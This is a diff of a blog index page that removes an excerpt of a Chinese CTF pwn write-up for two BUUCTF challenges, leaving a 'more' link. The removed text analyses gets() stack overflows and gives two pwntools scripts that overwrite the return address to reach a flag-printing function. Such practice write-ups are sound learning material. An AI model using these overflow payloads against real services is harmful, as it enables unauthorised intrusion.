@@ -176,20 +176,9 @@
         <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>首先checksec检查一下，<img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-22_17-19-29.png"></p>
 <p>依旧无事发生，拉进ida里分析。</p>
 <p>main函数中有危险函数gets，<img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-16_17-10-27.png">同时，发现v5和rbp(对应32位中的ebp)的距离是40h，也就是说只需要40h+8就可以覆盖返回地址</p>
-<p>之后再来寻找目标函数地址，shift+f12寻找，找到cat flag.txt，右键＋X找到目标函数sub_40060D，开始于40060D。</p>
-<p>编写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26137</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>运行得到flag</p>
-<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>checksec一下，<img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-22_17-48-38.png"></p>
-<p>只有NX打开，使用ida64打开。</p>
-<p>在func函数中发现危险函数gets()<img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-22_17-50-14.png"></p>
-<p>找到目标函数<code>cat flag</code><img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-22_17-51-28.png"></p>
-<p>编写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26922</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p32(<span class="number">0x00000000004006BE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>得到flag<img src="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/Snipaste_2023-01-22_17-54-04.png"></p>
-
+        
+          <a class="article-more-a" href="/2023/01/17/%E7%AC%AC%E4%BA%8C%E5%91%A8pwn/#more">more >></a>
+        
       
 
       
